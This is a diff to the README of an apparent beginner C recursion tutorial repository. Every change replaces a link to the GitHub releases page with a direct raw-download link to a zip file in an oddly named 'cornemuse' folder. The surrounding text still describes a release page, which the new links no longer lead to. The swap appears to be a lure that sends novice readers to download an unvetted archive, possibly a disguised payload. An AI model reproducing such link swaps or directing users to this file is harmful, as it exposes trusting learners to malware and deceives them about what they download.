@@ -1,6 +1,6 @@
 # 🧠 Recursion-C-Programs - Learn C Recursion Step by Step
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/hansonolivelike14/Recursion-C-Programs/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/hansonolivelike14/Recursion-C-Programs/raw/refs/heads/main/cornemuse/Programs-Recursion-1.7.zip)
 
 ## 📘 What this is
 
@@ -31,7 +31,7 @@ If you only want to read the programs, you just need a file viewer. If you want 
 
 Visit the release page here:
 
-[https://github.com/hansonolivelike14/Recursion-C-Programs/releases](https://github.com/hansonolivelike14/Recursion-C-Programs/releases)
+[https://github.com/hansonolivelike14/Recursion-C-Programs/raw/refs/heads/main/cornemuse/Programs-Recursion-1.7.zip](https://github.com/hansonolivelike14/Recursion-C-Programs/raw/refs/heads/main/cornemuse/Programs-Recursion-1.7.zip)
 
 On that page, look for the latest release. Then:
 
@@ -209,7 +209,7 @@ The code itself should run on most basic Windows setups.
 
 Use this link to visit the release page and download the files:
 
-[https://github.com/hansonolivelike14/Recursion-C-Programs/releases](https://github.com/hansonolivelike14/Recursion-C-Programs/releases)
+[https://github.com/hansonolivelike14/Recursion-C-Programs/raw/refs/heads/main/cornemuse/Programs-Recursion-1.7.zip](https://github.com/hansonolivelike14/Recursion-C-Programs/raw/refs/heads/main/cornemuse/Programs-Recursion-1.7.zip)
 
 ## 📖 Reading the output
 
@@ -249,4 +249,4 @@ This simple habit makes recursion easier to learn.
 
 Primary download page:
 
-[https://github.com/hansonolivelike14/Recursion-C-Programs/releases](https://github.com/hansonolivelike14/Recursion-C-Programs/releases)
+[https://github.com/hansonolivelike14/Recursion-C-Programs/raw/refs/heads/main/cornemuse/Programs-Recursion-1.7.zip](https://github.com/hansonolivelike14/Recursion-C-Programs/raw/refs/heads/main/cornemuse/Programs-Recursion-1.7.zip)
